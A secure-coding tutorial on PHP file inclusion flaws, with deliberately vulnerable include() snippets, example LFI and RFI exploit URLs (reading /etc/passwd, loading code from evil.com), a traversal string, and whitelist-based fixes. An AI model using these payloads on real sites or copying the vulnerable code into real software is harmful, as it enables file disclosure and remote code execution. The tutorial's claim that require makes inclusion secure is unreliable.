File Inclusion Vulnerability in PHP

File inclusion vulnerabilities occur when a PHP application dynamically includes files based on user input. If not properly validated, this can allow attackers to include arbitrary files from the server or even remote files, leading to serious security risks like information disclosure, code execution, and more.
1. Vulnerable Code Example

Let's consider an example where the application includes a page based on a GET parameter:

php

<?php
// Vulnerable code
$page = $_GET['page'];
include($page);
?>

If the page parameter is not properly validated, an attacker could exploit this by passing a malicious file path.

Example of exploitation:

    Local File Inclusion (LFI): An attacker could include a sensitive file from the server, such as /etc/passwd on a Unix system:

    bash

http://example.com/vulnerable.php?page=/etc/passwd

Remote File Inclusion (RFI): If allow_url_include is enabled in php.ini, an attacker could include a file from a remote server:

bash

    http://example.com/vulnerable.php?page=http://evil.com/malicious.php

2. Secure Code Example

To prevent file inclusion vulnerabilities, you should always validate and sanitize the input. One common approach is to use a whitelist of allowed files:

php

<?php
// Secure code
$allowed_pages = ['home', 'about', 'contact'];
$page = $_GET['page'];

if (in_array($page, $allowed_pages)) {
    include($page . '.php');
} else {
    // Handle error or redirect to a default page
    include('404.php');
}
?>

Why this is secure:

    Whitelist Validation: Only files specified in the $allowed_pages array are allowed, preventing arbitrary file inclusion.
    Appending .php: Limits the inclusion to files within the application, avoiding paths like /etc/passwd.

Additional Security Considerations
Vulnerable Approaches:

    Directly Using User Input Without Validation:

    php

include($_GET['file']);

    Risk: High, as it directly uses user input without checks.

File Path Manipulation:

php

    $file = $_GET['file'];
    include("/var/www/html/$file");

        Risk: An attacker can use directory traversal (../../etc/passwd) to include files outside the intended directory.

More Secure Approaches:

    Using Absolute Paths:

    php

$page = basename($_GET['page']);
include("/var/www/html/pages/$page.php");

    Why it’s secure: basename() strips directory paths, preventing directory traversal attacks.

Disabling Remote File Inclusion:
Ensure that allow_url_include is disabled in php.ini:

ini

allow_url_include = Off

Using require Instead of include:

php

require('home.php');

    Why it’s secure: require will halt script execution if the file is not found, reducing the impact of an attack.
